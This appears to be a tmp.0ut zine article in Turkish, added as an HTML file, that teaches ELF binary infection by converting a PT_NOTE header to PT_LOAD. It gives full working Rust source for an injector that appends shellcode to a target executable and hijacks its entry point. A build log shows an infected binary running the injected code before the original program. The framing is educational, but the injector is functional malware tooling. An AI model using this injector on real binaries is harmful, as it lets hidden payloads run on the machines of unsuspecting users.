@@ -1,0 +1,300 @@
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>   \_______________________________________________________________________/
+o_/_________________________________________________________________________\_o
+   | |          ___________                              __              | |
+   | |          \__    ___/____ ______      ____  __ ___/  |_            | |
+   | |            |    | /     \\____ \    /  _ \|  |  \   __\           | |
+   | |            |    ||  Y Y  \  |_&gt; &gt;  (  &lt;_&gt; )  |  /|  |             | |
+   | |            |____||__|_|  /   __/ /\ \____/|____/ |__|             | |
+   | |                        \/|__|    \/                               | |
+   | |                                                                   | |
+   | |         ::: PT_NOTE to PT_LOAD ELF injector (in Rust) :::         | |
+   | |              tmp.0ut'tan d3npa tarafından sevgilerle &lt;3
+   | |                                                                   | |
+
++------------------------------------------------------------------------------
+| Japonca versiyonunu Github üzerinden bulabilirsiniz / 日本語版はGithubにてご覧できます
+| https://github.com/d3npa/hacking-trix-rust/blob/main/elf/ptnote-infector
++------------------------------------------------------------------------------
+
+SymbolCrash blogunda ELF dosyasının başlık bilgilerinde bulunan PT_NOTE yapısını
+PT_LOAD yapısına çevirerek shellcode enjekte etmek üzerine bir teknik okudum. 
+Bu teknik bana ilginç ve ilgi çekici geldi, ben de ELF dosya yapısı üzerine çok 
+bilgili değildim; dolayısıyla bu durumu aynı anda birçok şeyi öğrenmek için bir 
+fırsat olarak değerlendirdim.
+
+Bu proje için mental_elf adını verdiğim, ELF meta bilgilerini okumayı ve işlemeyi
+kolaylaştıran, ufak ve daha tamamlanmamış bir kütüphane dosyası oluşturdum. 
+Oluşturduğum kütüphanenin kodunun sade ve anlaması kolay olduğu kanaatindeyim, 
+dolayısıyla bu yazıda kaynak kodlarını açıklamayacağım.
+
+====[ genel bir bakış ]==================================================================
+
+Başlıkta da belirttiğim üzere, bu dosya ulaştırma tekniği ELF dosyasının başlık 
+bilgilerindeki PT_NOTE yapısının shellcode çalıştırmak için PT_LOAD yapısına 
+dönüştürülmesinden ibaret. Bütün bu süreç aşağıdaki üç aşamada açıklanabilir:
+
+    - Zararlı kodun ELF dosyasının sonuna eklenmesi
+    - Zararlı kodun sanal adreslemede belirli bir adrese yüklenmesi
+    - ELF dosyasının giriş noktasının zararlı kod başlangıç adresiyle 
+    değiştirilmesi, bu yolla zararlı kodun ELF dosyası içeriğinden önce çalıştırılması
+
+Zararlı kodun çalıştırıldıktan sonra enjekte edildiği her ELF dosyasının orijinal 
+giriş noktasından programa devam edecek şekilde ayarlanması gerekiyor, bunu zararlının 
+enjekte edildiği ELF dosyasının çalıştığından emin olmak amacıyla yapıyoruz.
+
+Zararlı kod PT_LOAD yapısı kullanılarak program hafızasına yüklenebilir. Bir 
+ELF dosyasına yeni bir program başlık bilgisi eklemek dosyayı çalışmaz hale 
+getirebilir, ancak zaten var olan PT_NOTE başlığına yeni bir amaç verirsek bu 
+teknik çalıştırılabilir dosyayı bozmadan kullanılabilir.
+
+Aşağıda, ELF dosya formatı dokümentasyonundaki "Note" bölümüne dair bir kesit veriyorum: 
+
+    +--------------------------------------------------------------------------
+    | Note bilgisi opsiyoneldir. Note bilgilerinin varlığı programın 
+    | ABI performansını etkilemediği gibi, sağlanan bilgiler programın çalışma 
+    | esnasındaki davranışını da etkilemez. Diğer türlü, program ABI 
+    | (Application Binary Interface) tanımlanmamış davranışlara sebep olabilir. 
+    +--------------------------------------------------------------------------
+
+Benim bu süreçte farkına vardığım iki durumdan bahsedecek olursak:
+
+    - Basit teknikler PIE yüzünden çalışmıyor
+    - Go dili çalışma esnasında içerisinde versiyon bilgisi 
+    bulunduran geçerli bir PT_NOTE yapısına ihtiyaç duyuyor, 
+    bu nedenle incelediğimiz teknik Go çalıştırılabilir 
+    dosyalarında kullanılamıyor
+
+Not: PIE, cc boyutunda rustc ile kullanılacak `-C relocation-model=static` 
+komutunda `-no-pie` argümanıyla devre dışı bırakılabiliyor.
+
+====[ shellcode ]========================================================================
+
+Kullanacağımız zararlı kodu NetWrite Assembler (NASM) için yazacağız, 
+dolayısyla Makefile dosyanızı çalıştırmadan önce `nasm` yüklediğinizden 
+emin olun!
+
+Bu enjeksiyon tekniği için zararlı kodu oluşturabilmek için aklımızda 
+bulundurmamız gereken birkaç şey bulunuyor.
+
+AMD64 SYSTEM V ABI dokümentasyonun 3.4.1 kısmında rbp, rsp ve rdx 
+kaydedicilerinin program girişinden önce doğru değerleri bulundurduğundan 
+emin olmak gerekiyor.
+
+Bu koşulu sağlamak için zararlı kodda normalde de olduğu gibi birkaç tane 
+"push" ve "pop" operasyonuna ihtiyaç duyuyoruz. 
+
+Benim oluşturduğum zararlı kod rbp ve rsp içerisindeki değerlere müdahale 
+etmiyor, ayrıca programa dönmeden önce rdx işaretçisini sıfıra eşitlemek de 
+çalışıyor.
+
+Zararlı kodun işi bittikten sonra asıl programa atlayacak şekilde düzenlenmesi 
+gerekiyor. Bu düzenleme işlemini kolaylaştırmak adına zararlı kodun gerek 
+top-to-bottom yöntemiyle, gerek çalışma sekansı sırasında zararlı boş bir label 
+üzerinden koda atlamayla asıl çalıştırılabilir dosyanın son demlerinde 
+çalıştırılması sağlanabilir. 
+
+    +--------------------------------------------------------------------------
+    | main_tasks:
+    |    ; ...
+    |    jmp finish
+    | other_tasks:
+    |     ; ...
+    | finish:
+    +--------------------------------------------------------------------------
+
+Bu tasarımla düzenleme işlemi bir atlama komutu ekleme seviyesine indirgenebiliyor. 
+Ancak, x86_64 mimarisinde jmp komutu 64 bit bir argüman alamıyor. Bu durumun 
+üstesinden gelmek için atlama adresini rax işaretçisinde tutup `jmp rax` komutunu 
+kullanabilirsiniz. Rust ile yazdığım bu kod parçası, oluşturduğum "shellcode" bayt 
+vektörünü giriş noktasından yapılacak bir atlama operasyonuna ekleyecek şekilde 
+çalışıyor:
+
+    +--------------------------------------------------------------------------
+    | fn patch_jump(shellcode: &amp;mut Vec&lt;u8&gt;, entry_point: u64) {
+    |     // entry_point adresini rax içinde sakla
+    |     shellcode.extend_from_slice(&amp;[0x48u8, 0xb8u8]);
+    |     shellcode.extend_from_slice(&amp;entry_point.to_ne_bytes());
+    |     // rax işaretçisindeki adrese atla
+    |     shellcode.extend_from_slice(&amp;[0xffu8, 0xe0u8]);
+    | }
+    +--------------------------------------------------------------------------
+
+====[ bulaştırma işlemi ]================================================================
+
+Zararlı kodu bulaştırma işlemi src/main.rs dosyasında gerçekleşiyor.
+Takip etmesi kolay olsun diye top-to-bottom formatında yazdım, genel olarak ne yaptığını 
+anlayabilirseniz oldukça açık olmalı. Ayrıca anlamaya yardımcı olması bakımından yorum 
+satırları eklemeye özen gösterdim. Kod, yazdığım mental-elf kütüphanesini kullanarak bir 
+çalıştırılabilir dosyayı okuma ve yazma işlemlerini soyutlaştırma ve kolaylaştıma amacını 
+taşıyor; dolayısıyla tekniği görmeyi kolaylaştırıyor.
+
+Özetle, kod şunları yapıyor:
+- 2 tane komut satırı parametresi alıyor: hedef ELF dosyası ve zararlı kod
+- ELF dosyasını ve program başlık bilgilerini okuyor
+- Zararlı kodu programın başlanıgıç noktasına atlayacak şekilde düzenliyor
+- Düzenlenmiş zararlı kodu ELF dosyasının sonuna ekliyor
+- Program başlıklarından PT_NOTE yapısını bulup PT_LOAD yapısı olarak değiştiriyor
+- ELF dosyasının giriş noktasını zararlı kodun giriş noktası olacak şekilde değiştiriyor
+- Değiştirilmiş başlık bilgilerini ELF dosyasının üzerine yazıyor
+
+Zararlı kod bulaştırılmış ELF dosyası çalıştırıldığında, ELF dosya yükleyicisi birkaç kısmı 
+sanal hafızaya yerleştiriyor - bizim tarafımızdan oluşturulmuş PT_LOAD yapısı zararlı 
+kodumuzun yüklendiğinden ve çalıştırılabileceğinden emin oluyor.  ELF dosyasının giriş 
+noktası zararlı kodun çalıştırılacağı giriş noktasından başlatılıyor. Zararlı kod çalışmayı 
+bitirdiğinde ELF dosyasının orijinal giriş noktasına atlıyor ve çalıştırılabilir dosyanın 
+orijinal kodunu çalıştırmasını sağlıyor. 
+
+    +--------------------------------------------------------------------------
+    | $ make
+    | cd files &amp;&amp; make &amp;&amp; cd ..
+    | make[1]: Entering directory '/.../files'
+    | rustc -C opt-level=z -C debuginfo=0 -C relocation-model=static target.rs
+    | nasm -o shellcode.o shellcode.s
+    | make[1]: Leaving directory '/.../files'
+    | cargo run --release files/target files/shellcode.o
+    | Compiling mental_elf v0.1.0 
+    (https://github.com/d3npa/mental-elf#0355d2d3)
+    | Compiling ptnote-to-ptload-elf-injection v0.1.0 (/...)
+    |     Finished release [optimized] target(s) in 1.15s
+    |     Running `target/release/ptnote-to-ptload-elf-injection files/target 
+    files/shellcode.o`
+    | Found PT_NOTE section; converting to PT_LOAD
+    | echo 'Done! Run target with: `./files/target`'
+    | Done! Run target with: `./files/target`
+    | $ ./files/target
+    | dont tell anyone im here
+    | hello world!
+    | $
+    +--------------------------------------------------------------------------
+
+====[ kapanış ]==========================================================================
+
+Bu çok eğlenceli bir projeydi! Rust, ELF ve zararlılar hakkında birçok şey 
+öğrendim. Bu proje süresince bana öğreten, hata ayıklamama yardım eden ve 
+motive eden netspooky, sblip, TMZ ve tmp.0ut topluluğuna teşekkür ederim &lt;3
+
+Ekler:
+- https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/
+- http://www.skyfree.org/linux/references/ELF_Format.pdf
+- https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.95.pdf
+- https://github.com/d3npa/mental-elf
+
+Kaynak koda aşağıdan ulaşabilirsiniz.
+
+------------------------------------------------------------------------------
+  Cargo.toml
+------------------------------------------------------------------------------
+
+[package]
+...
+
+[dependencies.mental_elf]
+git = "https://github.com/d3npa/mental-elf"
+rev = "0355d2d35558e092a038589fc8b98ac9bc70c37b"
+
+------------------------------------------------------------------------------
+  main.rs
+------------------------------------------------------------------------------
+
+use mental_elf::elf64::constants::*;
+use std::{env, fs, process};
+use std::io::prelude::*;
+use std::io::SeekFrom;
+
+fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
+    let args: Vec&lt;String&gt; = env::args().collect();
+    if args.len() != 3 {
+        eprintln!("Usage: {} &lt;ELF File&gt; &lt;Shellcode File&gt;", args[0]);
+        process::exit(1);
+    }
+
+    let elf_path = &amp;args[1];
+    let sc_path = &amp;args[2];
+
+    // Open target ELF file with RW permissions
+    let mut elf_fd = fs::OpenOptions::new()
+        .read(true)
+        .write(true)
+        .open(&amp;elf_path)?;
+
+    // Load shellcode from file
+    let mut shellcode: Vec&lt;u8&gt; = fs::read(&amp;sc_path)?;
+
+    // Parse ELF and program headers
+    let mut elf_header = mental_elf::read_elf64_header(&amp;mut elf_fd)?;
+    let mut program_headers = mental_elf::read_elf64_program_headers(
+        &amp;mut elf_fd, 
+        elf_header.e_phoff, 
+        elf_header.e_phnum,
+    )?;
+
+    // Patch the shellcode to jump to the original entry point after finishing
+    patch_jump(&amp;mut shellcode, elf_header.e_entry);
+
+    // Append the shellcode to the very end of the target ELF
+    elf_fd.seek(SeekFrom::End(0))?;
+    elf_fd.write(&amp;shellcode)?;
+
+    // Calculate offsets used to patch the ELF and program headers
+    let sc_len = shellcode.len() as u64;
+    let file_offset = elf_fd.metadata()?.len() - sc_len;
+    let memory_offset = 0xc00000000 + file_offset;
+
+    // Look for a PT_NOTE section
+    for phdr in &amp;mut program_headers {
+        if phdr.p_type == PT_NOTE {
+            // Convert to a PT_LOAD section with values to load shellcode
+            println!("Found PT_NOTE section; converting to PT_LOAD");
+            phdr.p_type = PT_LOAD;
+            phdr.p_flags = PF_R | PF_X;
+            phdr.p_offset = file_offset;
+            phdr.p_vaddr = memory_offset;
+            phdr.p_memsz += sc_len as u64;
+            phdr.p_filesz += sc_len as u64;
+            // Patch the ELF header to start at the shellcode
+            elf_header.e_entry = memory_offset;
+            break;
+        }
+    }
+
+    // Commit changes to the program and ELF headers
+    mental_elf::write_elf64_program_headers(
+        &amp;mut elf_fd, 
+        elf_header.e_phoff,
+        elf_header.e_phnum,
+        program_headers,
+    )?;
+    mental_elf::write_elf64_header(&amp;mut elf_fd, elf_header)?;
+
+    Ok(())
+}
+
+fn patch_jump(shellcode: &amp;mut Vec&lt;u8&gt;, entry_point: u64) {
+    // Store entry_point in rax
+    shellcode.extend_from_slice(&amp;[0x48u8, 0xb8u8]);
+    shellcode.extend_from_slice(&amp;entry_point.to_ne_bytes());
+    // Jump to address in rax
+    shellcode.extend_from_slice(&amp;[0xffu8, 0xe0u8]);
+}
+
+------------------------------------------------------------------------------
+------------------------------------------------------------------------------
+</pre></div></center>
+</body></html>
